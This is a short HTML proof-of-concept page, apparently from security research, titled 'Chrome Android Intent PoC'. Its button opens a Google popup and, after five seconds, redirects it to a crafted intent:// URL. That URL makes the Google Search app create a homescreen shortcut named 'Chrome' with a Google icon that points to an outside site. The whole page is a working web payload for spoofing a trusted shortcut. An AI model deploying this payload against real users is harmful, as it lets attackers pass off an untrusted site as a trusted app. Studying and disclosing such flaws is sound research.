
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Chrome Android Intent PoC</title>
  <style>
    .button {
      background-color: #4CAF50;
      border: none;
      color: white;
      padding: 15px 32px;
      text-align: center;
      font-size: 16px;
      margin: 4px 2px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <script>
    function a() {
      const win = window.open("https://google.com", "x");

      if (!win) {
        alert("Popup blocked");
        return;
      }

      setTimeout(() => {
        const intentUrl =
          "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";

        win.location.href = intentUrl;
      }, 5000);
    }
  </script>

  <center>
    <input
      type="button"
      class="button"
      value="Open Android Intent Test"
      onclick="a()"
    >
  </center>
</body>
</html>
